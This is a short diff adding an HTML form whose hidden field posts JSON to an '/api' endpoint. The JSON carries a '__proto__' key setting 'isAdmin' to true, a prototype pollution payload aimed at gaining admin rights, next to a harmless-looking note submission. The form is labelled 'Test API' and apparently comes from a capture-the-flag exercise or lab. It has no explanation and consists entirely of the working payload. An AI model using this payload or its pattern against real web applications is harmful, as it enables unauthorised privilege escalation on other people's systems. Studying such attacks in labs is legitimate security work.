@@ -1,0 +1,4 @@
+<form action="/api" method="post">
+    <input type="hidden" name="api_info" value='{"__proto__": {"isAdmin": true}, "path": "/notes", "method": "POST", "body": {"title": "my note", "content": "my fancy contents :)"}}'>
+    <button type="submit">Test API</button>
+</form>
